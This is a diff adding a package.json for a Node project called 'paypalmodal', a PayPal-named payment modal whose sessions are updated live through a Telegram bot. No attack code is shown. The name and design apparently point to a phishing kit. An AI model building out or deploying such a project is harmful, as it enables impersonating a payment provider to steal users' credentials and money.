@@ -1,0 +1,16 @@
+{
+  "name": "paypalmodal",
+  "version": "1.0.0",
+  "description": "Real-time payment modal with Telegram-controlled session updates",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "bot": "node telegram-bot.js"
+  },
+  "dependencies": {
+    "dotenv": "^16.4.5",
+    "express": "^4.21.2",
+    "node-telegram-bot-api": "^0.66.0",
+    "ws": "^8.18.0"
+  }
+}
